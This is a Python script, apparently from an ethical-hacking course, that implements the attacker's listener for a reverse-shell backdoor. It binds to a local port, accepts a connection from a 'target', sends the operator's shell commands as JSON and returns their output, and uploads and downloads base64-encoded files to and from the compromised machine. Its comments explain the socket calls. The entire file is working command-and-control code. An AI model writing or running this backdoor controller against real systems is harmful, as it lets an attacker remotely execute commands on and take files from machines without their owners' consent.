import socket, json, base64

# socket.SOL_SOCKET: use this constant to manipulate the socket-level options
# socket.SO_REUSEADDR: whether bind should permit reuse of local addresses for this socket, enable this allow two socket use the same internet port number, nonzero value means yes

# python2 -> string, python3 -> bytes

# Backdoor crashed if:
#    1.Incorrect command is sent
#    2.Correct command is miss-used

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#set socket option
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))#use bind() to assign an address to this socket
        listener.listen(0)#0:how many connections could be queued 
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()#accept a connection and ip address belong to target
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)#Serialize obj to a JSON formatted str  
        self.connection.send(json_data.encode())#need to be a byte object

    def reliable_receive(self):
        json_data = b""
        # continue receive data untill it is end and could be deserialised
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)#Deserialisation json data
            except ValueError:
                continue # continue will go to the start of loop, pass will go to the next statement

    def execute_remotely(self, command):
        self.reliable_send(command)#send the command to remote machine
        if command[0] == "exit":
            self.connection.close()
            exit()#exit the program

        return self.reliable_receive()#return output

    def write_file(self, path, content):
        with open(path, "wb") as file:# write file as byte
            file.write(base64.b64decode(content.encode()))#a bytes-like object is required, not a 'str'
            return "[+] Download successfully"
        
    def read_file(self, path):
        with open(path, "rb") as file:#read file as byte
            return base64.b64encode(file.read())#return a bytes

    def run(self):
        while True:
            # command = raw_input(">> ")
            command = input(">> ")
            command = command.split(" ")#command list contain 2 string type

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])#file_content is a byte object
                    command.append(file_content.decode())#command list contain 2 string and 1 bytes, but bytes is not a JSON serializable

                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution"

            print(result)

my_listener = Listener("10.0.2.5", 6868)
my_listener.run()

